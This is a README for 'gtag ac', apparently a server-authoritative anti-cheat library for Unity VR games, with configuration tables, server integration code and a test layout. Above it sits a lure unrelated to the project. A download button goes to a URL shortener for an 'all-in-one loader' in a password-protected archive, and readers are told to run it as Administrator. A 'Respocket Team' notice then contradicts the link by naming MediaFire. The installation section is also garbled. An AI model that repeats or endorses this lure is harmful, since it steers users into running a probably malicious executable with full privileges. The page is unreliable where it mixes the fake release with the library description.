<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# gtag ac

**gtag ac** — lightweight, server authoritative anti cheat for unity vr games with physics based gorilla locomotion, arm climbing, grappling, momentum swings.

plain c sharp, zero dependencies, no obfuscation, no reflection in runtime checks, no linq, no per frame allocations, no playerprefs for bans.

```
namespace gtagac
```

---

## features

| check | class | flags | what it does |
|---|---|---|---|
| speed | `gacspd` | 1 | sustained horizontal speed above limit, measured over a sliding window, burst tolerance for hand swings |
| teleport | `gactp` | 3 | impossible displacement between samples, physics burst aware, needs confirmation |
| jump | `gacjmp` | 1 | impossible vertical impulse, separated from normal momentum |
| fly | `gacfly` | 1 | long air time with no physical cause, no rise, no fall, no travel |
| gravity | `gacgrav` | 1 | missing gravity, velocity deviates from the ballistic model, never uses raw position y |
| velocity | `gacvel` | 2 | horizontal velocity, vertical velocity and velocity deltas validated separately |
| arm | `gacarm` | 1 | vr hand speed and hand teleport, only active when hand transforms are provided |
| position | `gacpos` | 2 | history buffer analysis, spikes against the local mean, no single frame verdict |
| consistency | `gaccon` | 2 | acceleration derived from reported positions, catches position writes with a clean velocity |
| noclip | `gacnc` | 3 | the segment between two reported samples crosses solid geometry, needs **server side colliders** |
| rate | `gacrat` | 2 | movement update flooding and packet spam protection |
| env | `gacenv` | 4 | time scale tampering, suspicious delta time, local movement parameter tampering |

- flag system with per check weights, decay and confidence aggregation
- FNV style hash over the whole config, so any runtime change of limits is detected
- punishments, warning, kick, temporary ban, permanent ban, each independently switchable
- optional evidence gate, a punishment waits for **independent** checks to agree
- sequence numbers, timestamps and clock offset learning, with replay and stale rejection
- network aware tolerances, ping, jitter and packet loss widen the limits automatically
- optional server side prediction `gacpred` with bounded, non snapping correction
- ring buffered structured log `gaclog`, exportable as text or csv through `gacdiag`
- whitelist, development builds, admins, trusted players
- events, `onflag`, `onwarning`, `onkick`, `onban`, plus alloc free `igace` sinks
- custom checks through `gaccheck` and `gacc`, one class plus one `gac.reg()` line
- networking abstraction through `igacnet`, core is framework agnostic
- ban storage abstraction `igacbanstore`, in memory store for tests, file store for the server
- 211 automated tests, nunit only as a dev dependency, never in the runtime assembly
- debug overlay and debug logging, silent in release builds

---

## unity versions

| branch | status | notes |
|---|---|---|
| 2021.3 lts | tested, build clean | minimum supported, `unity: 2021.3` in `package.json` |
| 2022.3 lts | supported | same api surface as 2021.3, same code path |
| 6000.0 and newer | tested, build clean | uses `linearVelocity` through `gacd.bvel` |

tested by compiling against the real unity assemblies of 2021.3.21f1, 6000.3.6f1 and 6000.5.0f1, zero errors and zero warnings on every branch.

the only version dependent code is `gacd.bvel`, which returns `linearVelocity` on unity 6 and `velocity` on older versions. that is required, because `linearVelocity` does not exist before unity 6 and `velocity` is deprecated on unity 6.

no reflection, no conditional compilation around the checks themselves.

---

## installation

unity package manager, add package from git url:

```
## setup

```csharp
using gtagac;

public class boot : MonoBehaviour
{
    void Start()
    {
        gacp.maxspeed = 12f;
        gacp.maxvel = 20f;
        gacp.tpd = 3f;
        gacp.fth = 10;

        gac.init(transform);
    }

    void Update()  { gac.tick(); }
    void FixedUpdate() { gac.phys(); }
}
```

full setup with vr hands, debug overlay and event handlers:

```csharp
gacs.onflag    = e => Debug.Log("flag    " + e.id + " " + e.chk + " " + e.rsn + " " + e.cf + " " + e.cfl);
gacs.onwarning = e => SendWarning(e.id, e.rsn);
gacs.onkick    = e => KickPlayer(e.id, e.rsn);
gacs.onban     = e => BanPlayer(e.id, e.rsn);

gac.init(playerRoot, leftHand, rightHand, playerBody);

gameObject.AddComponent<gacgui>();
gameObject.AddComponent<gacdw>();
```

`gac.tick()` runs in `Update` and steps time, `gac.phys()` runs in `FixedUpdate` and does the ground probe. checks themselves run on the fixed interval `gacp.ivl`, twenty hertz by default.

zero code option, add the `gacm` component to the player object and fill `root`, `hl`, `hr`, `body`.

---

## configuration

everything lives in `gacp`.

| field | default | meaning |
|---|---|---|
| `maxspeed` | 18 | max horizontal player speed, m over s. the fastest physically consistent swing on a 6 to 16 m rope peaks below this, see `Tests/rope.cs` |
| `maxvel` | 20 | max velocity magnitude, m over s |
| `tpd` | 3 | max teleport distance per check interval, m |
| `maxjmp` | 9 | max jump impulse, m over s |
| `maxair` | 8 | max air time before the fly check reacts, s |
| `maxhand` | 14 | max hand speed, m over s |
| `maxupd` | 60 | max movement updates per second |
| `fth` | 10 | flag threshold, warning |
| `kth` | 25 | kick threshold |
| `bth` | 45 | ban threshold |
| `bcf` | 0.9 | ban confidence threshold |
| `maxwarn` | 3 | warnings before silence |
| `decay` | 0.6 | flag decay, points per second |
| `ivl` | 0.05 | check interval, s |
| `burst` | 1.35 | burst tolerance multiplier |
| `smp` | 3 | samples above the limit required in a window |
| `tps` | 2 | teleport confirmations required |
| `grav` | 9.81 | gravity used by the ballistic model |
| `maxacc` | 200 | max velocity change per second |
| `gtol` | 2 | allowed gravity deviation, m over s |
| `gmin` | 0.2 | grace before the gravity check |
| `hov` | 0.5 | vertical speed considered hover |
| `swgsp` | 2 | hand speed considered swinging |
| `conacc` | 60 | max acceleration derived from positions, m over s2 |
| `consmp` | 3 | confirmations required by the consistency check |
| `maxid` | 0.15 | max interval between samples used by the consistency check |
| `grdchk` | true | ground probe in `FixedUpdate` |
| `grdoff` `grdlen` `grdmask` | 0.35, 1.2, all | ground probe parameters |
| `cs` `ct` `cj` `cf` `cg` `cv` `ca` `cp` `cr` `ce` `cc` | true | per check enable |
| `pun` `pwn` `pkk` `pkb` `pbm` | true | punishment switches |
| `bper` | false | ban permanent instead of temporary |
| `dbg` `dbgf` `dbgi` | false, false, 0.25 | debug output, force debug in release, debug interval |
| `devby` | true | bypass in development builds |
| `wl` `wlst` | empty, true | whitelist ids |
| `loc` | true | run client side checks |
| `allowsc` | false | allow time scale changes |
| `btmp` | 1440 | temporary ban minutes |

### network tolerances

these widen every limit automatically as the link gets worse. they adapt per player, so one slow player never loosens the rest.

| field | default | meaning |
|---|---|---|
| `stale` | 0.35 | max client timestamp lag before the packet is rejected, s, `strict` only |
| `fut` | 0.5 | max timestamp from the future, s, `strict` only |
| `seqwin` `seqgap` | 32, 8 | sequence window, gap that counts as suspicion |
| `jitter` | 0.05 | weight of measured jitter in the uncertainty budget |
| `loss` | 0.1 | weight of measured packet loss in the uncertainty budget |
| `netslack` | 1.25 | multiplier on the computed slack |
| `maxun` | 0.5 | cap on total uncertainty, s |
| `maxslack` | 6 | cap on the resulting distance slack, m |
| `pin` | 0 | static ping allowance added to every player, s |
| `pingmax` | 2 | cap on a measured rtt, s |
| `strict` | false | reject replay, stale and out of order packets |

`strict` defaults to **off**, which preserves the original behaviour of `gac.upd`. Turn it on when the transport cannot reorder or duplicate packets.

### evidence gate

before a kick or a ban, the gate can require that several **different** checks agree. repeated flags of one check never count as independent evidence.

| field | default | meaning |
|---|---|---|
| `evon` | false | master switch, opt in |
| `evmin` | 2 | distinct checks required inside the window |
| `evcf` | 0.35 | minimum confidence |
| `evwin` | 30 | evidence window, s |

warnings are never gated. they are informational and blocking them would only hide a detection from the operator. a held back punishment is written to the log with level `gate`, and it is applied as soon as the evidence arrives, so the gate can delay a kick but never cancel one.

### noclip

| field | default | meaning |
|---|---|---|
| `ncsmpl` | 1 | confirmed wall crossings required before flagging |
| `ncviol` | 2 | clean samples required to clear accumulated suspicion |
| `nccap` | 0.05 | skin ignored at the start of the segment, m |
| `ncahead` | 0.15 | look ahead past the end of the segment, m |
| `nccf` | 0.5 | confidence per confirmed crossing |
| `ncdot` | 0.1 | how squarely the surface must face the movement |
| `ncmask` | all | layer mask of world geometry |
| `ncloc` | false | also run on a client, see below |

`gacnc` **requires authoritative world colliders**. on a dedicated server that is normal. on a client the colliders belong to the cheater, so the check stays silent unless you explicitly set `gacp.ncloc = true`, and even then client side evidence is weak. use `ncmask` to exclude player, vehicle and platform layers.

### prediction

`gacpred` is off by default. it is for the **rendering** of remote players, not for validation.

| field | default | meaning |
|---|---|---|
| `prdmax` | 1 | largest correction folded in per update, m |
| `prdmaxoff` | 3 | cap on the accumulated visual offset, m |
| `prdrate` | 4 | how fast the offset bleeds away, per second |

```csharp
gacp.pr = true;

Vector3 p = gacpred.pos(id);

transform.position = p;
```

what it does and does not do:

- the server model always snaps to the **reported** position, so it can never drift
- the visual offset is capped per update by `prdmax` and overall by `prdmaxoff`
- the offset bleeds to zero exponentially, so a correction is spread over several frames
- a stall longer than `gacp.maxid` resets the model and clears the offset instead of snapping
- **prediction never feeds the checks.** the detection history holds reported positions only

this is why the correction cannot teleport a player and why latency alone cannot produce a flag. it is a de jitter layer, not a physics predictor: it smooths the gap between what the server last heard and what it last drew.

> **`gacpred` is not a defence against a client that teleports.**
>
> the caps bound how far a *rendered* remote player can be dragged from what the server last received. they do **not** validate anything. if your server accepts the client's position without an authoritative check, the client can still choose where it goes and `gacpred` will faithfully smooth the jump. the limits keep other players from seeing a rubber band, they do not stop the cheat.
>
> a correct server needs all three of:
>
> 1. `gacp.srv = true` and `gac.upd2` or `gacsrv.up` on the receiving side, so the checks see the reported stream at all
> 2. authoritative world colliders on the server, otherwise `gacnc` cannot see a wall crossing
> 3. your own authority decision, for example a swept shape cast that resolves the player against the server world and sends back a corrected position. `gacpred` renders that decision, it does not make it
>
> if you have none of these, treat the server side checks as telemetry only, exactly like the client side ones.

### logging and diagnostics

| field | default | meaning |
|---|---|---|
| `logon` | true | record structured events |
| `loglim` `logwin` | 8, 10 | records per player per window |
| `logkeep` | 512 | ring size |
| `logn` | false | also record per packet network events, off by default because it runs on every lost packet |

```csharp
string report = gacdiag.txt();     // full text report
string csv = gacdiag.csv();        // event log as csv
bool ok = gacdiag.save("diag.txt");
```

`loglim` protects against a cheater flooding the log. warnings, kicks, bans and held back punishments are never rate limited away, because losing those would hide the important part. the limit is per player, so one flooder cannot starve the rest.

all numbers are formatted with the invariant culture, so a comma decimal separator cannot corrupt the csv.

### switching checks

```csharp
gacp.sw("speed");
gac.sync();
```

or directly:

```csharp
gacp.maxspeed = 14f;
gac.chk(0).on = false;
```

---

## events

```csharp
public struct gace
{
    public string id;
    public string chk;
    public string rsn;
    public float cf;
    public float cfl;
    public float tm;
}
```

```csharp
gacs.onflag = e => { };
gacs.onwarning = e => { };
gacs.onban = e => { };
gacs.onkick = e => { };
```

`gace` is a struct, so the lambdas above box on every call. for a hot path, or when you need more than one listener, implement `igace` and bind it. this does not allocate:

```csharp
public sealed class mysink : igace
{
    public void onflag(gace e) { }
    public void onwarning(gace e) { }
    public void onkick(gace e) { }
    public void onban(gace e) { }
}

gacs.bind(new mysink());
gacs.unbind(sink);
```

the structured log is itself an `igace`, bound automatically, so `gaclog` keeps working no matter what you do with the lambdas.

---

## custom checks

```csharp
using gtagac;

public sealed class gacnoclip : gacc
{
    public gacnoclip()
    {
        nm = "noclip";
        weight = 3f;
        cooldown = 0.7f;
    }

    public override void tick(gacd d, float dt)
    {
        if (d.h.n < 2) return;

        float dy = d.h.now.y - d.h.at(1).y;

        if (dy < gacp.tpd * -0.5f) return;

        flg(d, 0.8f, "noclip");
    }
}

gac.init(transform);
gac.reg(new gacnoclip());
gacr.wgt.set("noclip", 3f);
```

`gacc` gives `nm`, `on`, `weight`, `cooldown`, `flg()`. `gacr.wgt.set(name, weight)` overrides the weight at runtime. this is the whole extension mechanism, core is never edited.

---

## server integration

server authoritative, the client never decides that its position is valid.

client sends its state:

```csharp
gac.upd(playerId, position, velocity, isGrounded);
```

server receives and validates:

```csharp
gacsrv.init();

gacsrv.seq(true);          // opt in to replay and stale rejection

gacsrv.join(id);
bool ok = gacsrv.up(id, position, velocity, isGrounded, clientTime);
gacsrv.leave(id);
```

`gacsrv.up` returns whether the packet was accepted. `join` is optional, an unannounced id is registered on its first packet, which is what a real server sees when the handshake is still in flight. a kicked or banned id is refused at every entry point, and `gacsrv.rtt(id, rtt)` feeds the per player ping.

`gac.upd` validates position, velocity, movement delta, timestamps and player state on the receiving side, then `gacr` picks the punishment. kicked and banned players are rejected through `gac.st(id)`.

for full sequence and timestamp validation, use `gac.upd2`:

```csharp
bool ok = gac.upd2(id, position, velocity, isGrounded, sequence, clientTime);
```

`upd2` rejects replayed, stale and future packets, learns the client's clock offset, and measures jitter and loss to widen the tolerances automatically. a large **forward** sequence gap is accepted and counted as loss rather than rejected, because muting an honest player after a stall buys no security. backward movement is only rejected when `gacp.strict` is on, which preserves the original behaviour of `gac.upd`.

tell the server about measured latency:

```csharp
gac.ping(id, rtt);
gac.dropped(id);
gac.outoforder(id);
```

ping is stored per player, so one slow player never loosens everyone else, and an implausible rtt is capped by `gacp.pingmax`.

server ban storage:

```csharp
gacban ban = new gacban("serverdata/gtagacbans.txt");
ban.load();
gac.store = ban;
```

permanent bans live on the server side only, never in `playerprefs`. `gacbm` is the in memory store for tests.

client side fallback when no server is available:

```csharp
gac.init(playerRoot, leftHand, rightHand, playerBody);
```

client checks are weaker by nature, treat them as telemetry only.

### network adapters

core references no networking framework. implement `igacnet`:

```csharp
public interface igacnet
{
    string id { get; }
    bool srv { get; }
    Vector3 pos { get; }
    Vector3 vel { get; }
    float t { get; }
    bool grnd { get; }
    void kick(string r);
    void ban(string r, float m);
}
```

photon, fusion, normcore, netcode for gameobjects and mirror all fit behind this one interface. see `samples~/gacnetex.cs`.

---

## false positive prevention

- every check needs several consecutive samples, never a single frame verdict
- burst tolerance `gacp.burst` for gorilla locomotion swings and rope physics
- network aware tolerances, ping, jitter and loss widen the limits per player
- optional evidence gate, a punishment can wait for independent checks to agree
- `gacgrav` uses the ballistic model plus velocity, never raw `position.y`
- `gacfly` ignores rising, falling and travelling states
- gravity, speed, velocity and position checks suspend themselves while grabbing, climbing or swinging
- `gacarm` is active only when hand transforms are provided
- grace window `gac.grace(id, 0.5f)` for respawn, portals, ropes, vehicles, cutscenes
- per check cooldown stops flag spam
- `gacp.devby` bypasses everything in development builds
- whitelist for admins and trusted players

report game state and the checks adapt to it:

```csharp
gac.me.st(character.IsGrounded, character.JumpPressed, character.Climbing, character.InWater, character.Grabbing);
```

---

## performance

- checks run on the fixed interval `gacp.ivl`, twenty hertz by default, not per frame
- `Update` only steps time, `FixedUpdate` only does the ground probe
- ring buffers with pre allocated arrays, zero heap allocation in the check path
- no linq, no reflection, no exceptions inside checks
- `Vector3` math only, no allocations for distance or damping
- one ground `Physics.CheckSphere` per interval, not per frame
- events and debug output are opt in
- **zero bytes allocated per tick**, verified by test

the allocation behaviour is pinned by tests rather than asserted in prose. `Tests/perf.cs` measures `GC.GetAllocatedBytesForCurrentThread` across 2000 updates and requires exactly zero bytes for:

- a clean network stream
- a cheating player, every frame, before the kick
- a player after the kick, where `p.sent` short circuits **before** any string is built
- the whole local path, `smp` plus all twelve checks
- the same stream with `gacpred` on
- a lossy link with jitter

that last one is why per packet network logging is behind `gacp.logn` and defaults to off: it runs on every lost packet, on every player, and scales with packet loss rather than with cheating.

how it is achieved:

- flag reasons are formatted **after** `gacr.canflg` accepts the flag. the cheap guards, `p.sent` and the per check cooldown, run first, so a rejected flag costs no string at all
- debug strings are built only inside `if (gacp.dbgo())`
- the player table is capped at `gacp.slots` and evicts cleanly
- structured events go through `igace` instead of `Action<gace>`, which avoids boxing the struct

---

## debug

```csharp
gacp.dbg = true;
gacp.dbgf = Debug.isDebugBuild;
gameObject.AddComponent<gacgui>();
gameObject.AddComponent<gacdw>();
```

overlay and logs show speed, velocity, flags, confidence and active checks. `gacp.dbgf` forces debug output inside a release build, `gacp.dbg` alone stays silent outside development builds. press `gacp.dbgkey`, `F1` by default.

---

## repository layout

```
gtagac/
  readme.md
  license
  changelog.md
  migration.md
  package.json
  runtime/
    gtagac.asmdef
    core/        gac.cs gacp.cs gacf.cs gacper.cs gacr.cs gacev.cs gacsq.cs
                 gacpred.cs gacm.cs gacgui.cs gacdw.cs
    checks/      gaccheck.cs gacspd.cs gactp.cs gacjmp.cs gacfly.cs
                 gacgrav.cs gacvel.cs gacarm.cs gacpos.cs gaccon.cs
                 gacnc.cs gacrat.cs gacenv.cs
    data/        gacd.cs gacv.cs
    util/        gaclog.cs gacdiag.cs gactime.cs gacmath.cs
    net/         igacnet.cs
    ban/         gacbm.cs gacban.cs
    server/      gacsrv.cs
  samples~/
    gacboot.cs gacnetex.cs gtagac.smp.asmdef
  Tests/         gtagac.tests.asmdef, shared tests
  dev/           headless test runner, dotnet test
```

---

## upgrading from 1.0.1

see `migration.md`. in short: the code compiles as is, detection becomes about one flag sooner because a bug that swallowed the first flag of every check is fixed, and four things you may have relied on were weaker than they looked. raising `fth`, `kth` and `bth` by one restores the previous cadence.

---

## license

mit, see `license`.

## tests

211 tests, nunit is a **dev dependency only** and never enters the runtime assembly.

```
Tests/                shared, run in unity test runner and headless
  harness.cs          simulation helpers and the shared legit scenario set, no assertions
  baseline.cs         the original behaviour still holds
  seq.cs              sequence, staleness, clock offset, legacy upd
  legit.cs            walk, fast walk, jump, climb, swing, jitter, fall, collision push
  netfp.cs            clean, jitter, loss, loss plus jitter, stall, strict on and off
  exploits.cs         speed, teleport, fly, gravity, jump, rate, config, acceleration
  srv.cs              join and leave, timestamps, sequences, kick and ban re-entry, slot cap
  noclip.cs           wall crossing in both directions, back faces, grace, mask
  noclipfp.cs         a sweep that trips only the wall check, and the same sweep in an empty world
  gate.cs             evidence gate, single versus multiple exploits, false positives
  evidence.cs         flag counter semantics, independence, decay, window
  pred.cs             prediction under ping, loss, sharp turns, gorilla locomotion
  anticheat.cs        prediction never hides a reported teleport from the checks
  rope.cs             energy consistent rope lengths and swings, speedhacks still caught
  thresh.cs           the first flag fix, threshold sensitivity, no new false positives
  diag.cs             an impossible sample that must be caught
  diaglog.cs          ring buffer, rate limiting, csv, culture independence
  perf.cs             zero allocation per tick, bounded tables, event sinks
dev/                  headless runner, dotnet test
  tests.csproj
  UnityStub.cs        minimal UnityEngine shim, enables the same tests outside unity
```

run headless:

```
cd dev
dotnet test
```

or let unity run them, the `Tests` assembly is editor only and guarded by `UNITY_INCLUDE_TESTS`.

two suites exist on purpose. `legit`, `netfp` and `noclipfp` must always produce **zero** flags, they are the false positive guard. `gate` and `thresh` additionally check that real exploits are still caught, so the suite fails both if a check gets too timid and if it gets too noisy.

the legitimate scenario set lives in one place, `tst.legit()`, so a new check cannot be added without being proven against the whole set.

### a note on `gacf.add`

the flag counter used to create a new entry with `n = 0`, so the first flag of any check was never counted. every threshold was effectively reached one flag late. it is fixed and pinned by `Tests/thresh.cs`, and the same file verifies that the resulting earlier threshold does not introduce a single false positive across the legit scenarios, a bad wifi link and a frozen stream.

this shifts every threshold slightly earlier, i.e. detection is marginally more sensitive than in 1.0.1. raising `fth`, `kth` and `bth` by one restores the previous cadence exactly. see `migration.md`.

---

## roadmap

- rotation and angular velocity check
- anim and rig integrity signals from the networking layer
- per check statistical thresholds learned from the server baseline
- matchmaking trust score
- official photon and fusion adapters


---

MIT License

Copyright (c) 2026 gtag ac

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
